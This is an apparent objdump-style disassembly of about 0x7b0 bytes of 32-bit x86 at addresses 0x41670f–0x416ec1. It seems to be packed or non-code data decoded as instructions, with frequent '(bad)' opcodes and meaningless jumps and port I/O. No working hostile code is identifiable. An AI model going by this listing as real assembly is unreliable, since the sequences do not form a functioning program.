  41670f:	shr    DWORD PTR [ebx-0x4018d1e0],cl
  416715:	cdq    
  416716:	xchg   ebx,eax
  416717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416718:	and    DWORD PTR [esi-0x3f],edx
  41671b:	pushf  
  41671c:	loop   0x41673a
  41671e:	in     al,dx
  41671f:	cs push es
  416721:	pop    ds
  416722:	cmp    bh,bl
  416724:	into   
  416725:	loop   0x416731
  416727:	mov    ah,0x94
  416729:	lock or ebx,edx
  41672c:	stos   DWORD PTR es:[edi],eax
  41672d:	repz inc edx
  41672f:	test   BYTE PTR [edi],ch
  416731:	push   0x7956b9ee
  416736:	js     0x4166cd
  416738:	adc    eax,DWORD PTR [esi+edx*4+0x5a]
  41673c:	mov    cl,0xd
  41673e:	xchg   esi,eax
  41673f:	jnp    0x4166cb
  416741:	adc    eax,0xd035939a
  416746:	adc    eax,0xdd0864e1
  41674b:	aad    0x9a
  41674d:	mov    eax,ds:0xe10a8931
  416752:	adc    bh,ah
  416754:	std    
  416755:	popf   
  416756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416757:	push   ds
  416758:	loopne 0x416796
  41675a:	xchg   edi,eax
  41675b:	repnz add edx,ebp
  41675e:	mov    esi,0x26a35aed
  416763:	jbe    0x4167b4
  416765:	cmc    
  416766:	jbe    0x416794
  416768:	(bad)  
  416769:	xchg   ebp,eax
  41676a:	ss repz pop edi
  41676d:	dec    edi
  41676e:	pop    ds
  41676f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416770:	mov    ds:0x7775b88a,al
  416775:	rol    DWORD PTR [ebx],1
  416777:	xchg   ebp,eax
  416778:	fsubr  QWORD PTR [ebx-0x3935d047]
  41677e:	jno    0x416785
  416780:	out    0x77,eax
  416782:	das    
  416783:	mov    gs,ebp
  416785:	jecxz  0x41671f
  416787:	cwde   
  416788:	dec    ecx
  416789:	pop    edx
  41678a:	shr    DWORD PTR [edx-0x7a],1
  41678d:	mov    eax,0xe12c6371
  416792:	neg    bl
  416794:	fnstsw WORD PTR [ebp+eax*1-0x3d40ee69]
  41679b:	es pop es
  41679d:	fisubr WORD PTR [ebx]
  41679f:	stc    
  4167a0:	adc    eax,0x98474a1d
  4167a5:	outs   dx,DWORD PTR ds:[esi]
  4167a6:	(bad)
  4167aa:	out    0x98,eax
  4167ac:	mov    al,ds:0xa25b6b96
  4167b1:	jge    0x416781
  4167b3:	shr    dh,1
  4167b5:	in     al,0x40
  4167b7:	js     0x4167dc
  4167b9:	pusha  
  4167ba:	dec    ecx
  4167bb:	pop    ebx
  4167bc:	mov    BYTE PTR [ecx],dl
  4167be:	jg     0x4167f0
  4167c0:	inc    eax
  4167c1:	or     eax,0x8369d007
  4167c6:	mov    edi,0x1b149647
  4167cb:	sub    ebx,ecx
  4167cd:	adc    BYTE PTR [eax+0x434fe716],cl
  4167d3:	cli    
  4167d4:	lea    esi,[ebx+0x3f78226]
  4167da:	ss inc edx
  4167dc:	push   es
  4167dd:	ins    DWORD PTR es:[edi],dx
  4167de:	imul   esp,DWORD PTR [esi],0x2fbf8991
  4167e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e5:	and    dl,BYTE PTR [esi+eax*8]
  4167e8:	jl     0x416830
  4167ea:	xchg   edx,eax
  4167eb:	cmp    BYTE PTR [ebp+ebp*8-0x44bd78ce],al
  4167f2:	gs cmp eax,0xa5cb0796
  4167f8:	stos   BYTE PTR es:[edi],al
  4167f9:	stos   BYTE PTR es:[edi],al
  4167fa:	sbb    edi,DWORD PTR [edx]
  4167fc:	gs push cs
  4167fe:	mov    ebp,0xd1ef4625
  416803:	pop    eax
  416804:	test   BYTE PTR [ebx+0x14],0x16
  416808:	ins    DWORD PTR es:[edi],dx
  416809:	popf   
  41680a:	adc    eax,0xc2f3b2e
  41680f:	fidivr WORD PTR [esi]
  416811:	cld    
  416812:	lea    edx,[ecx]
  416814:	(bad)  
  416816:	jecxz  0x4167a4
  416818:	xchg   ebp,eax
  416819:	dec    ecx
  41681a:	cmp    BYTE PTR [edx-0x609b9238],ah
  416820:	jle    0x41682f
  416822:	pushf  
  416823:	cmp    bl,al
  416825:	fldcw  WORD PTR [esi+edx*8]
  416828:	fcomp  DWORD PTR [ebx-0x77c41d8e]
  41682e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41682f:	xor    BYTE PTR [ebx+0x60],al
  416832:	fs xchg edx,eax
  416834:	xchg   edi,eax
  416835:	cmp    eax,DWORD PTR [ecx]
  416837:	mov    cl,0x8b
  416839:	into   
  41683a:	pop    ebx
  41683b:	xor    al,0x8c
  41683d:	enter  0x187f,0x3
  416841:	aam    0xe5
  416843:	sbb    DWORD PTR [esp+ecx*4-0x31e102f2],eax
  41684a:	xchg   ch,dh
  41684c:	push   esp
  41684d:	fsubr  DWORD PTR [esi-0x6f8041b1]
  416853:	outs   dx,DWORD PTR ds:[esi]
  416854:	mov    ebp,0xd984b2d2
  416859:	sbb    eax,0x1fba4736
  41685e:	pop    DWORD PTR [esp+esi*2+0x27]
  416862:	pop    edx
  416863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416864:	lods   al,BYTE PTR ds:[esi]
  416865:	add    BYTE PTR ds:0x5aead293,dl
  41686b:	iretw  
  41686d:	lds    esi,FWORD PTR [edx]
  41686f:	xchg   ebx,eax
  416870:	inc    edi
  416871:	or     eax,0x95d00091
  416876:	int    0x8d
  416878:	adc    al,0x3
  41687a:	lea    ebp,[ebp+0x4e]
  41687d:	imul   BYTE PTR [ebp+0xa13aa67]
  416883:	fcomp  DWORD PTR [edi+0x8fdf08]
  416889:	hlt    
  41688a:	cmp    bh,bl
  41688c:	outs   dx,DWORD PTR ds:[esi]
  41688d:	rcr    al,1
  41688f:	shl    BYTE PTR [eax+0x67],cl
  416892:	ret    0xd31a
  416895:	jmp    0xede6:0xd834952a
  41689c:	cmp    DWORD PTR [esi+0x5],0x98b091a4
  4168a3:	mul    DWORD PTR [ecx+0x393c0c7f]
  4168a9:	call   0xf0477414
  4168ae:	jmp    FWORD PTR [esi-0x713444a6]
  4168b4:	std    
  4168b5:	push   edi
  4168b6:	sub    eax,0x9b1ca1f7
  4168bb:	repz cwde 
  4168bd:	xor    eax,0x41dbaf80
  4168c2:	sub    DWORD PTR [edi+0x519793be],edx
  4168c8:	popa   
  4168c9:	and    esi,DWORD PTR [ebp+0x6d]
  4168cc:	nop
  4168cd:	mov    esp,0x31cace13
  4168d2:	cld    
  4168d3:	(bad)  
  4168d4:	lods   al,BYTE PTR cs:[esi]
  4168d6:	iret   
  4168d7:	sbb    BYTE PTR [eax-0x1a],al
  4168da:	outs   dx,DWORD PTR ds:[esi]
  4168db:	icebp  
  4168dc:	mov    bh,BYTE PTR [eax+0x628dcade]
  4168e2:	add    ecx,DWORD PTR [edx+0x11]
  4168e5:	or     al,0x6f
  4168e7:	loope  0x416890
  4168e9:	mov    cl,0xcd
  4168eb:	mov    ebx,0xb89d8fba
  4168f0:	(bad)  
  4168f1:	adc    ebx,edi
  4168f3:	mov    ecx,ecx
  4168f5:	sar    BYTE PTR [edi-0x6c],cl
  4168f8:	lods   al,BYTE PTR ds:[esi]
  4168f9:	or     ebp,DWORD PTR [edx-0x32]
  4168fc:	mov    al,ds:0x8c2583d5
  416901:	xchg   esi,eax
  416902:	(bad)  
  416903:	aas    
  416904:	inc    edi
  416905:	ins    BYTE PTR es:[edi],dx
  416906:	mov    cl,0x2f
  416908:	imul   edi,DWORD PTR [edi+0x1c],0x26de0b61
  41690f:	add    ah,dh
  416911:	jne    0x416921
  416913:	mov    ah,0xb2
  416915:	pop    esp
  416916:	dec    edi
  416917:	iret   
  416918:	js     0x416941
  41691a:	sub    BYTE PTR [ecx-0x37c5b1e4],al
  416920:	and    bh,cl
  416922:	cmp    DWORD PTR [edx-0xded2e1f],ebp
  416928:	push   0x441ac0d3
  41692d:	lods   al,BYTE PTR ds:[esi]
  41692e:	int    0x96
  416930:	test   DWORD PTR [edi],0x82f7c116
  416936:	sbb    esp,DWORD PTR [ebx+ebx*8-0x68]
  41693a:	ss ins BYTE PTR es:[edi],dx
  41693c:	loopne 0x41694d
  41693e:	adc    BYTE PTR [edi-0x42],dl
  416941:	sub    esp,DWORD PTR [eax*8-0x116860db]
  416948:	leave  
  416949:	ja     0x416908
  41694b:	aam    0xe0
  41694d:	mov    al,ds:0xa9d645e8
  416952:	jmp    0x4169c3
  416954:	mov    ebx,0x1e121c48
  416959:	shr    bh,1
  41695b:	push   ds
  41695c:	fsubr  QWORD PTR [eax+ecx*1-0x3]
  416960:	cmp    esi,ecx
  416962:	gs mov dh,0xbb
  416965:	xlat   BYTE PTR ds:[ebx]
  416966:	pop    eax
  416967:	jp     0x4169d4
  416969:	in     al,dx
  41696a:	lahf   
  41696b:	nop
  41696c:	repnz mov bl,0x3c
  41696f:	mov    dh,0xfd
  416971:	jmp    0x416950
  416973:	js     0x41690b
  416975:	inc    esp
  416976:	xor    al,0x19
  416978:	pop    esp
  416979:	push   ss
  41697a:	push   ecx
  41697b:	push   edi
  41697c:	das    
  41697d:	mov    cl,0x2
  41697f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416980:	adc    DWORD PTR [edi-0x242fab85],edx
  416986:	jg     0x4169e5
  416988:	push   0x4c67d965
  41698d:	fcomp  QWORD PTR [ebp+0x43]
  416990:	sub    BYTE PTR [edx+0x48],ch
  416993:	xchg   edi,eax
  416994:	inc    esi
  416995:	mov    bh,0x3b
  416997:	mov    bh,BYTE PTR [edi+0x355962ee]
  41699d:	test   BYTE PTR [edi-0x2b5b454d],ah
  4169a3:	ficom  DWORD PTR [eax+0x2d]
  4169a6:	shr    BYTE PTR [eax+edi*4-0x40],cl
  4169aa:	xchg   esi,eax
  4169ab:	mov    edi,0x282087df
  4169b0:	fadd   st,st(3)
  4169b2:	mov    esi,0x5eb7d0e8
  4169b7:	mov    bl,0x31
  4169b9:	gs jge 0x416991
  4169bc:	in     al,0x6b
  4169be:	imul   ebx,DWORD PTR ds:0xf5ac,0xffffffde
  4169c4:	mov    WORD PTR [ebp-0x3482b1c9],ds
  4169ca:	jne    0x4169f7
  4169cc:	das    
  4169cd:	jp     0x4169e6
  4169cf:	sti    
  4169d0:	popf   
  4169d1:	(bad)  
  4169d2:	mov    eax,ds:0x53ccdb23
  4169d7:	test   al,0x3c
  4169d9:	dec    ecx
  4169da:	int3   
  4169db:	fsub   DWORD PTR [edx+0x7e]
  4169de:	inc    edx
  4169df:	mov    ch,BYTE PTR [ecx]
  4169e1:	cmp    bh,al
  4169e3:	jb     0x4169e5
  4169e5:	stc    
  4169e6:	clc    
  4169e7:	pop    ecx
  4169e8:	mov    ds:0xe26f99d9,eax
  4169ed:	shl    DWORD PTR [ebx-0x4c06c774],0xac
  4169f4:	cmp    DWORD PTR [ebp-0x4545e80f],eax
  4169fa:	lock xor eax,0x47771bdc
  416a00:	mov    al,ds:0x206c4c2d
  416a05:	gs pop ss
  416a07:	adc    DWORD PTR ds:0x6eb9b197,ebx
  416a0d:	out    dx,eax
  416a0e:	int3   
  416a0f:	jbe    0x4169ab
  416a11:	ins    DWORD PTR es:[edi],dx
  416a12:	lds    ebp,FWORD PTR [edi-0x57]
  416a15:	out    dx,al
  416a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a17:	in     eax,0xd9
  416a19:	outs   dx,BYTE PTR ds:[esi]
  416a1a:	pop    es
  416a1b:	mov    bh,0xac
  416a1d:	cli    
  416a1e:	xchg   esi,eax
  416a1f:	push   ss
  416a20:	dec    eax
  416a21:	pop    ebx
  416a22:	jb     0x4169e1
  416a24:	mov    esi,0xe21af1ff
  416a29:	arpl   WORD PTR [ecx+0x15],sp
  416a2c:	aas    
  416a2d:	add    edx,DWORD PTR [ebp+0x2a]
  416a30:	iret   
  416a31:	ss jno 0x416a45
  416a34:	mov    ch,BYTE PTR [eax+eax*4]
  416a37:	mov    ds:0x292506cf,eax
  416a3c:	test   dh,cl
  416a3e:	or     BYTE PTR [ebp-0x7b],ah
  416a41:	mov    cl,0x8e
  416a43:	or     al,ah
  416a45:	pushf  
  416a46:	test   BYTE PTR [ebp+0x5cc8f581],dl
  416a4c:	repz aam 0x85
  416a4f:	jae    0x416a41
  416a51:	scas   al,BYTE PTR es:[edi]
  416a52:	(bad)  [edx+eax*1-0x15]
  416a56:	cmp    edi,ebp
  416a58:	pop    esp
  416a59:	or     eax,0x80b9b6f1
  416a5e:	or     ch,BYTE PTR [ebp-0x3b1178a5]
  416a64:	pusha  
  416a65:	bound  ebx,QWORD PTR [edx-0x3a]
  416a68:	add    eax,0xc69c16ac
  416a6d:	sub    DWORD PTR gs:[ebx+0x7a],ecx
  416a71:	pop    edx
  416a72:	repz sar BYTE PTR [ecx+0xb3b8792],cl
  416a79:	mov    ch,0x91
  416a7b:	cmc    
  416a7c:	pusha  
  416a7d:	hlt    
  416a7e:	pushf  
  416a7f:	in     al,dx
  416a80:	xchg   ebp,eax
  416a81:	pop    ss
  416a82:	adc    eax,0x5f5ce2eb
  416a87:	mov    bl,0xf6
  416a89:	sbb    al,0xed
  416a8b:	pushf  
  416a8c:	fnstcw WORD PTR [ebp-0x10d4b64]
  416a92:	fmul   QWORD PTR [eax-0x78]
  416a95:	shl    DWORD PTR [edx+0x49],cl
  416a98:	lock daa 
  416a9a:	cs inc esp
  416a9c:	mov    ecx,0x61d56c9
  416aa1:	out    0x62,al
  416aa3:	push   es
  416aa4:	shr    BYTE PTR [edi-0x37],cl
  416aa7:	mov    bl,0xc2
  416aa9:	out    0xc4,al
  416aab:	mov    esp,0x3693db8b
  416ab0:	cmp    DWORD PTR [ecx+0x47],eax
  416ab3:	mov    ch,0xff
  416ab5:	ret    0x6472
  416ab8:	jns    0x416b36
  416aba:	mov    dh,0x43
  416abc:	ret    0x8c9f
  416abf:	jecxz  0x416ac2
  416ac1:	and    BYTE PTR [ebp+0x4],bl
  416ac4:	and    bl,ah
  416ac6:	call   0xd824609c
  416acb:	lock sbb DWORD PTR [esi],ebx
  416ace:	out    dx,eax
  416acf:	loope  0x416b19
  416ad1:	and    bh,BYTE PTR [eax]
  416ad3:	cli    
  416ad4:	xor    edx,eax
  416ad6:	pop    ebx
  416ad7:	int    0x7f
  416ad9:	jae    0x416ab2
  416adb:	(bad)  
  416adc:	dec    ebp
  416add:	in     eax,dx
  416ade:	popf   
  416adf:	ins    DWORD PTR es:[edi],dx
  416ae0:	lods   eax,DWORD PTR ds:[esi]
  416ae1:	std    
  416ae2:	jns    0x416a78
  416ae4:	jp     0x416acb
  416ae6:	iret   
  416ae7:	jbe    0x416aa0
  416ae9:	out    0x94,al
  416aeb:	cmp    BYTE PTR [edi],ah
  416aed:	and    edx,edx
  416aef:	add    cl,BYTE PTR [eax]
  416af1:	cmp    esi,eax
  416af3:	inc    ecx
  416af4:	outs   dx,BYTE PTR ds:[esi]
  416af5:	nop
  416af6:	je     0x416afb
  416af8:	push   ebx
  416af9:	xor    DWORD PTR [ebp-0x51],eax
  416afc:	es out 0x32,eax
  416aff:	popf   
  416b00:	lock adc al,0xc7
  416b03:	push   esp
  416b04:	cmp    esp,0xd82e8c5a
  416b0a:	mov    al,ds:0xc6321230
  416b0f:	mov    esi,0xc55bbc8d
  416b14:	shl    BYTE PTR [edx+0x37],1
  416b17:	push   ss
  416b18:	out    dx,eax
  416b19:	xchg   ebx,eax
  416b1a:	dec    edx
  416b1b:	jne    0x416b60
  416b1d:	mov    ch,al
  416b1f:	std    
  416b20:	ins    DWORD PTR es:[edi],dx
  416b21:	lods   al,BYTE PTR ds:[esi]
  416b22:	je     0x416ac8
  416b24:	xchg   esp,eax
  416b25:	sub    al,0xd4
  416b27:	or     DWORD PTR [ebp+0x68b5d0ea],edi
  416b2d:	es xchg ecx,ebp
  416b30:	(bad)  
  416b31:	or     BYTE PTR [edi-0x11b8d039],ah
  416b37:	leave  
  416b38:	pop    edi
  416b39:	cmp    bl,0xf5
  416b3c:	cmp    ecx,esi
  416b3e:	lds    ebx,FWORD PTR [eax+0x7b]
  416b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b42:	iret   
  416b43:	jg     0x416b9b
  416b45:	btr    esp,ebx
  416b48:	int3   
  416b49:	sub    ebp,DWORD PTR [eax]
  416b4b:	adc    eax,0x254e2085
  416b50:	jle    0x416ae5
  416b52:	in     al,dx
  416b53:	mov    WORD PTR [eax+eiz*1],cs
  416b56:	gs inc edx
  416b58:	ja     0x416bb5
  416b5a:	dec    ecx
  416b5b:	xor    dl,BYTE PTR [esi+edx*8-0x27df61a3]
  416b62:	(bad)  
  416b63:	mov    ds:0x7509785f,eax
  416b68:	adc    DWORD PTR [esi-0xea3ace6],0x55
  416b6f:	or     eax,0x28b32d03
  416b74:	cmp    edi,DWORD PTR [ecx-0x5354c92a]
  416b7a:	or     eax,0xbc3c518
  416b7f:	xor    BYTE PTR [esi+0x36c8bdc9],dl
  416b85:	inc    edx
  416b86:	push   ebx
  416b87:	sub    dh,BYTE PTR [ebx-0x27]
  416b8a:	sti    
  416b8b:	lahf   
  416b8c:	sbb    DWORD PTR [ecx+0x7538d585],edi
  416b92:	mov    ds:0xcf089277,eax
  416b97:	jmp    0xe024:0xb4759b8b
  416b9e:	xchg   edx,eax
  416b9f:	inc    edi
  416ba0:	test   eax,0x4e5135fd
  416ba5:	test   eax,0x58034ddd
  416baa:	pop    ecx
  416bab:	out    dx,eax
  416bac:	and    DWORD PTR [esi+edx*2-0x3f],eax
  416bb0:	pop    ebp
  416bb1:	cld    
  416bb2:	sub    bl,ch
  416bb4:	pop    ebx
  416bb5:	cmp    eax,0xd7a080cb
  416bba:	into   
  416bbb:	es mov edx,edx
  416bbe:	pop    ss
  416bbf:	or     eax,0x17c61449
  416bc4:	xor    eax,0xffdd8a22
  416bc9:	je     0x416c33
  416bcb:	sub    esi,DWORD PTR [edx+0x50]
  416bce:	in     eax,0x8f
  416bd0:	ds out dx,al
  416bd2:	test   BYTE PTR [ecx+0x66],dh
  416bd5:	pop    esp
  416bd6:	xor    BYTE PTR [edi-0x467fb71a],bl
  416bdc:	inc    eax
  416bdd:	inc    eax
  416bde:	lods   eax,DWORD PTR ds:[esi]
  416bdf:	or     eax,0xc74a38f3
  416be4:	repnz xor BYTE PTR [eax+0x4f],cl
  416be8:	mov    ecx,0x2d104de9
  416bed:	div    DWORD PTR [edx-0x41]
  416bf0:	ins    DWORD PTR es:[edi],dx
  416bf1:	jg     0x416c1c
  416bf3:	jae    0x416c2c
  416bf5:	es inc edx
  416bf7:	or     BYTE PTR [ecx+0x93c0723],dl
  416bfd:	inc    ebx
  416bfe:	ja     0x416ba5
  416c00:	mov    eax,ds:0xdf03589c
  416c05:	xor    eax,0x333e3a74
  416c0a:	sub    DWORD PTR [ecx+0x7a8ab2a4],edi
  416c10:	imul   eax,edx,0xe4b0d897
  416c16:	test   al,dh
  416c18:	loop   0x416bc8
  416c1a:	stos   BYTE PTR es:[edi],al
  416c1b:	pop    esi
  416c1c:	push   ecx
  416c1d:	fsub   DWORD PTR [edi+0x69]
  416c20:	xor    BYTE PTR [edi],ah
  416c22:	cwde   
  416c23:	inc    edi
  416c24:	mov    esi,0x95c6d990
  416c29:	retf   0xcbad
  416c2c:	pusha  
  416c2d:	sub    DWORD PTR [ecx],ebx
  416c2f:	gs mov esp,0xc117fd0f
  416c35:	gs (bad) 
  416c37:	xor    esi,0x5537fddf
  416c3d:	add    al,0x3c
  416c3f:	sbb    dh,BYTE PTR [edi+edi*1-0x54]
  416c43:	xor    ebp,esp
  416c45:	jns    0x416c34
  416c47:	pop    esp
  416c48:	imul   edi,DWORD PTR [esi],0x43be1dd
  416c4e:	pop    esp
  416c4f:	inc    ebp
  416c50:	(bad)  
  416c51:	mov    bh,0x50
  416c53:	arpl   WORD PTR [eax-0x11],ax
  416c56:	aas    
  416c57:	sbb    esp,esi
  416c59:	sbb    al,0x24
  416c5b:	daa    
  416c5c:	(bad)  
  416c5d:	or     BYTE PTR [edi+0x4304ff5d],cl
  416c63:	call   ebx
  416c65:	pop    ecx
  416c66:	xchg   esp,eax
  416c67:	sub    ecx,DWORD PTR [edx]
  416c69:	(bad)  
  416c6b:	dec    ebx
  416c6c:	mov    ds:0x1198148,al
  416c71:	or     al,BYTE PTR [ebx]
  416c73:	mov    dh,0x5d
  416c75:	in     al,0x72
  416c77:	aas    
  416c78:	sbb    ch,BYTE PTR [ebx+0x4c]
  416c7b:	shr    ebx,1
  416c7d:	adc    al,0x9d
  416c7f:	add    eax,0x8e081864
  416c84:	frstor [edi-0x52]
  416c87:	mov    dh,0x47
  416c89:	mov    eax,fs
  416c8b:	stos   WORD PTR es:[edi],ax
  416c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8e:	sbb    DWORD PTR [ecx+ebp*1-0x921a4c0],eax
  416c95:	xlat   BYTE PTR ds:[ebx]
  416c96:	loop   0x416c4f
  416c98:	jge    0x416c2c
  416c9a:	mov    WORD PTR [eax-0xce120f8],ss
  416ca0:	and    bl,ah
  416ca2:	dec    esi
  416ca3:	sti    
  416ca4:	aad    0xb
  416ca6:	pop    ds
  416ca7:	mov    bl,0x12
  416ca9:	outs   dx,DWORD PTR ds:[esi]
  416caa:	mov    edi,0x2368864c
  416caf:	pusha  
  416cb0:	pop    edi
  416cb1:	or     ecx,DWORD PTR [bp+di-0x5649]
  416cb6:	sbb    al,0xd7
  416cb8:	repnz sub eax,0x9d98ab7e
  416cbe:	xchg   DWORD PTR [edi+0x39],eax
  416cc1:	and    BYTE PTR [edx],cl
  416cc3:	js     0x416c84
  416cc5:	es ds stos BYTE PTR es:[edi],al
  416cc8:	inc    ecx
  416cc9:	cld    
  416cca:	xchg   ebx,eax
  416ccb:	sub    DWORD PTR [edi+edx*8-0x7f47d591],ebx
  416cd2:	call   0xda9b:0x260b
  416cd8:	sub    ebp,ebp
  416cda:	pop    esp
  416cdb:	jle    0x416cec
  416cdd:	mov    edx,0x57f1ddda
  416ce2:	scas   al,BYTE PTR es:[edi]
  416ce3:	(bad)  
  416ce4:	aad    0x9
  416ce6:	jne    0x416d01
  416ce8:	jge    0x416c94
  416cea:	jns    0x416d21
  416cec:	jg     0x416d3c
  416cee:	ss dec edi
  416cf0:	and    ebp,DWORD PTR [esp+esi*1-0x4586bc33]
  416cf7:	outs   dx,BYTE PTR ds:[esi]
  416cf8:	jae    0x416d6e
  416cfa:	repnz or al,0xf3
  416cfd:	pop    ds
  416cfe:	push   0x2d
  416d00:	pcmpgtb mm6,QWORD PTR [eax-0x576a58d6]
  416d07:	in     eax,0x13
  416d09:	repnz in eax,0x7
  416d0c:	add    bh,BYTE PTR [esi+0x42721cfe]
  416d12:	popf   
  416d13:	cmp    ecx,DWORD PTR [ecx]
  416d15:	mov    fs,ecx
  416d17:	dec    esp
  416d18:	sbb    al,0xf2
  416d1a:	imul   eax,DWORD PTR [edi-0x2421636d],0xffffff9b
  416d21:	imul   esi,ebx,0x40
  416d24:	add    al,0x37
  416d26:	(bad)  
  416d27:	dec    ebx
  416d28:	cs pop ss
  416d2a:	(bad)  
  416d2b:	sub    DWORD PTR [eax],ebp
  416d2d:	sar    dl,cl
  416d2f:	or     esp,DWORD PTR [edx+0x53]
  416d32:	shl    BYTE PTR [ebx+0x0],1
  416d35:	mov    eax,ds:0xc603b8b4
  416d3a:	sahf   
  416d3b:	mov    eax,ds:0xb99b0ac8
  416d40:	inc    ecx
  416d41:	and    eax,0xde830076
  416d46:	xor    bl,dh
  416d48:	sub    DWORD PTR [edi+ecx*8-0x50],ebp
  416d4c:	je     0x416d49
  416d4e:	imul   esi,DWORD PTR [ebx+0x5b84f9ee],0xffffffba
  416d55:	aad    0xf6
  416d57:	std    
  416d58:	sub    al,BYTE PTR [ebx+edx*8+0x55]
  416d5c:	add    DWORD PTR [ebx-0xb],edi
  416d5f:	mov    eax,0xbe716bac
  416d64:	pop    DWORD PTR [eax+0x1e]
  416d67:	aaa    
  416d68:	es inc ecx
  416d6a:	mov    bh,0xb3
  416d6d:	bound  eax,QWORD PTR [esi-0x1b684f0e]
  416d73:	add    al,0x4
  416d75:	jno    0x416d63
  416d77:	ror    ebp,0x9a
  416d7a:	and    al,0x17
  416d7c:	or     ebp,0x24dac6a6
  416d82:	sbb    al,0x79
  416d85:	push   edx
  416d86:	lahf   
  416d87:	and    bh,BYTE PTR [ecx-0x46ca07d5]
  416d8d:	and    al,BYTE PTR ds:0x3f9d5d43
  416d93:	int    0x5c
  416d95:	xlat   BYTE PTR ds:[ebx]
  416d96:	aam    0xa9
  416d98:	cmp    DWORD PTR [edx-0x30e82157],ebp
  416d9e:	sbb    ah,bl
  416da0:	fadd   QWORD PTR [ebp-0x53]
  416da3:	add    DWORD PTR [eax+0x74],eax
  416da6:	cmp    ebp,DWORD PTR [esi+0xf6d0558]
  416dac:	adc    eax,DWORD PTR [edi+0x28f0e41]
  416db2:	arpl   WORD PTR [ebx+0x7d],bp
  416db5:	out    dx,eax
  416db6:	push   esp
  416db7:	push   esp
  416db8:	outs   dx,BYTE PTR ds:[esi]
  416db9:	call   0x9e1a0931
  416dbe:	pop    edx
  416dbf:	hlt    
  416dc0:	jo     0x416d72
  416dc2:	inc    esi
  416dc3:	stc    
  416dc4:	or     eax,0x6514fbb4
  416dc9:	data16 mov BYTE PTR [edx-0x3e],dh
  416dcd:	pop    ss
  416dce:	in     eax,dx
  416dcf:	test   ebx,ecx
  416dd1:	push   esi
  416dd2:	push   eax
  416dd3:	test   DWORD PTR [esi-0x49],ebp
  416dd6:	push   ss
  416dd7:	jno    0x416e06
  416dd9:	mov    esp,0xbeb98e65
  416dde:	nop
  416ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de0:	cli    
  416de1:	mov    ecx,eax
  416de3:	fnsetpm(287 only) 
  416de5:	ficom  WORD PTR [esi]
  416de7:	or     eax,ebp
  416de9:	clc    
  416dea:	inc    ebx
  416deb:	fnstcw WORD PTR [ebp+0x69]
  416dee:	mov    cl,0x70
  416df0:	outs   dx,DWORD PTR ds:[esi]
  416df1:	dec    ecx
  416df2:	xchg   DWORD PTR [ecx+0x76],edx
  416df5:	test   ebx,edx
  416df7:	dec    esp
  416df8:	push   ds
  416df9:	push   edi
  416dfa:	dec    eax
  416dfb:	(bad)  
  416dfc:	nop
  416dfd:	fdivr  DWORD PTR ds:0x6e016555
  416e03:	pop    esi
  416e04:	(bad)  
  416e05:	cmp    eax,0x52e09a00
  416e0a:	and    DWORD PTR [ecx+ecx*4],edi
  416e0d:	push   es
  416e0e:	aaa    
  416e0f:	fbld   TBYTE PTR [edi-0x30]
  416e12:	clc    
  416e13:	mov    cl,0xa4
  416e15:	in     eax,0xcc
  416e17:	rcl    DWORD PTR [esi+0x4db7d10c],cl
  416e1d:	mov    dh,0xfe
  416e1f:	dec    eax
  416e20:	loope  0x416da2
  416e22:	sti    
  416e23:	xchg   edx,eax
  416e24:	xchg   esp,eax
  416e25:	lods   eax,DWORD PTR ds:[esi]
  416e26:	push   ss
  416e27:	out    dx,eax
  416e28:	cld    
  416e29:	sub    DWORD PTR [ebx],edi
  416e2b:	call   0xfdb:0x390a77b7
  416e32:	or     DWORD PTR [edx+0x471966fd],0xffffff8f
  416e39:	jo     0x416e36
  416e3b:	stos   BYTE PTR es:[edi],al
  416e3c:	mov    bl,0xbe
  416e3e:	pop    edi
  416e3f:	adc    BYTE PTR [ebx-0x7a538e9],0x3b
  416e46:	out    dx,eax
  416e47:	mov    ebx,DWORD PTR [ebp-0x24]
  416e4a:	push   ebx
  416e4b:	and    BYTE PTR [ecx+0xb],ah
  416e4e:	repnz xor BYTE PTR [edx+0x7eb72580],dl
  416e55:	add    al,0xa1
  416e57:	cmp    al,0xae
  416e59:	mov    eax,0x72858abf
  416e5e:	dec    BYTE PTR [edx+0xfba7f6b]
  416e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e65:	pop    esp
  416e66:	ins    BYTE PTR es:[edi],dx
  416e67:	add    dl,BYTE PTR [bp+di]
  416e6a:	add    cl,ah
  416e6c:	in     al,dx
  416e6d:	and    ebx,DWORD PTR [esi-0x51]
  416e70:	aaa    
  416e71:	mov    eax,ds:0xf18c8077
  416e76:	jno    0x416eea
  416e78:	and    eax,edi
  416e7a:	jg     0x416eec
  416e7c:	hlt    
  416e7d:	sub    ecx,ecx
  416e7f:	fwait
  416e80:	jle    0x416e18
  416e82:	bound  edx,QWORD PTR [ecx]
  416e84:	pushaw 
  416e86:	push   ebx
  416e87:	mov    ds:0x36a4fc62,al
  416e8c:	repz pop es
  416e8e:	jae    0x416e32
  416e90:	loop   0x416e8b
  416e92:	icebp  
  416e93:	sti    
  416e94:	xor    DWORD PTR [esi],edx
  416e96:	mov    eax,0xd670fc0f
  416e9b:	cmpxchg DWORD PTR [ebp+esi*1-0xc],edx
  416ea0:	fs push ecx
  416ea2:	into   
  416ea3:	cdq    
  416ea4:	int3   
  416ea5:	in     al,dx
  416ea6:	inc    edx
  416ea7:	rcl    DWORD PTR [ebp-0x5b],1
  416eaa:	push   ds
  416eab:	leave  
  416eac:	inc    ebx
  416ead:	mov    ah,dh
  416eaf:	jae    0x416e3f
  416eb1:	push   esi
  416eb2:	(bad)  
  416eb3:	ins    BYTE PTR es:[edi],dx
  416eb4:	xchg   ebx,eax
  416eb5:	mov    WORD PTR [edx],gs
  416eb7:	pop    edx
  416eb8:	iret   
  416eb9:	jae    0x416f04
  416ebb:	std    
  416ebc:	repnz inc edx
  416ebe:	xor    DWORD PTR [esi+edx*2],eax
  416ec1:	mov    ss,WORD PTR [esi]
